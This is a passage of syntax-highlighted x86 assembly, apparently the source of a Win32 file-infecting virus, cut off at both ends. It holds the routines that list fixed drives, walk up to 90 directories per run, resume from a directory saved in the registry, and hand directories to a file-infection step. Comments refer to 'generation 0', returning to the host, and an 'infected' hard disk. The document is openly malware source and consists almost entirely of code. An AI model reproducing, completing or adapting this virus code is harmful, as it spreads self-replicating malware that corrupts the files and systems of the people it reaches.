                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">generation0_exit</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">; exit from generation 0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ReturnToHost</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ</span><span class="sc0">
</span><span class="sc1">;Û Check the system routines                                              Û</span><span class="sc0">
</span><span class="sc1">;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ</span><span class="sc0">

</span><span class="sc5">CheckSystem</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">                             </span><span class="sc1">; save regs</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">temp_path</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; start from "c:\"</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">system_paths</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">retrive_drive_type</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetDriveTypeA</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get drive type</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                         </span><span class="sc1">; is it a fixed disk?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">check_next_path</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                         </span><span class="sc1">; save the name in the list</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">check_next_path</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; and go on until z:\
       cmp byte ptr [esi], 'z'            ;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">finished_paths_search</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retrive_drive_type</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">finished_paths_search</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                       </span><span class="sc1">; mark the end</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CheckSystem</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">system_paths</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">; drives table</span><span class="sc0">
</span><span class="sc5">temp_path</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">"c:\", 0                  ; first path
</span><span class="sc5">allfiles</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"*.*"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; all files mask</span><span class="sc0">
</span><span class="sc5">dotdot</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">".."</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; dot dot</span><span class="sc0">

</span><span class="sc9">comment</span><span class="sc0"> </span><span class="sc5">%</span><span class="sc0">
</span><span class="sc1">;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ</span><span class="sc0">
</span><span class="sc1">;Û Allocate memory area                                                   Û</span><span class="sc0">
</span><span class="sc1">;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Entry:  ECX = size of memory to allocate</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return: EAX = new memory area address if succes</span><span class="sc0">
</span><span class="sc1">;         EAX = 0, CF set if error</span><span class="sc0">

</span><span class="sc5">AllocateMemory</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                    </span><span class="sc1">; push ammount of memo</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc0">                                   </span><span class="sc1">; fixed mem initialized</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GlobalAlloc</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; with 0</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_memory</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_memory</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AllocateMemory</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ</span><span class="sc0">
</span><span class="sc1">;Û Free memory area                                                       Û</span><span class="sc0">
</span><span class="sc1">;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Entry:  EAX = memory area handle</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return: nothing</span><span class="sc0">

</span><span class="sc5">FreeMemory</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">; free the memory</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GlobalFree</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; handle</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">FreeMemory</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">%</span><span class="sc0">

</span><span class="sc1">;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ</span><span class="sc0">
</span><span class="sc1">;Û Locate needed directories                                              Û</span><span class="sc0">
</span><span class="sc1">;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Entry:  EDI = pointer to the directory to start from</span><span class="sc0">
</span><span class="sc1">;         EAX = pointer in the system paths</span><span class="sc0">

</span><span class="sc5">LocateNextDirectory</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">                             </span><span class="sc1">; save regs</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">signal</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">files</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                 </span><span class="sc1">; how many files ?</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">scanneddirs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">90</span><span class="sc0">          </span><span class="sc1">; how many directories ?</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">; start from...</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">parse_all_system</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">signal</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_more_handles</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                           </span><span class="sc1">; set the current dir to the</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; root of the dir</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                       </span><span class="sc1">; ebx will hold the entries in</span><span class="sc0">
                                          </span><span class="sc1">; the depth</span><span class="sc0">
</span><span class="sc5">find_first_directory</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">signal</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_first_dir_found</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">searchrec</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; locate the first directory</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">allfiles</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_FindFirstFileA</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_first_dir_found</span><span class="sc0">              </span><span class="sc1">; if we didn't find any...</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; save the handle</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">check_attributes</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.FileAttributes</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc1">; is it really a</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">find_next_directory</span><span class="sc0">            </span><span class="sc1">; directory?</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.FileName</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; get directory name and be sure</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">            </span><span class="sc1">; it isn't "." or ".."</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">find_next_directory</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">; set it as the new current</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; directory</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">skip</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">; do we need to check the path?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">locate_files</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">                             </span><span class="sc1">; if so, then first get the current</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tempdir</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; directory and...</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tempdir</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key_data</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; ...compare it with the one saved</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                       </span><span class="sc1">; in the registry...</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_lstrlen</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                          </span><span class="sc1">; if they are equal, we start over</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_found_our_dir</span><span class="sc0">              </span><span class="sc1">; from there...</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">locate_files</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">not_found_our_dir</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">still_go</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">locate_files</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">skip</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">TESTONLY</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ELSE</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateFilesInDirectory</span><span class="sc0">        </span><span class="sc1">; ...</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">scanneddirs</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; do not scan more than 90 dirs.</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">still_ok</span><span class="sc0">                       </span><span class="sc1">; If HDD is completely infected the</span><span class="sc0">
                                          </span><span class="sc1">; process would slow too much...</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">signal</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">still_ok</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">files</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">still_go</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">signal</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">still_go</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; push the handle</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">; increment pushed handles number</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">find_first_directory</span><span class="sc0">           </span><span class="sc1">; and search again</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">find_next_directory</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">signal</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_next_dir_found</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                           </span><span class="sc1">; let's find the next directory</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_FindNextFileA</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_next_dir_found</span><span class="sc0">               </span><span class="sc1">; if no next dir...</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">check_attributes</span><span class="sc0">               </span><span class="sc1">; otherwise check...</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_first_dir_found</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">; if no new dir was found in where</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">signal</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">don_t_change</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dotdot</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; we are let's go back one dir</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">; changing to '..'</span><span class="sc0">
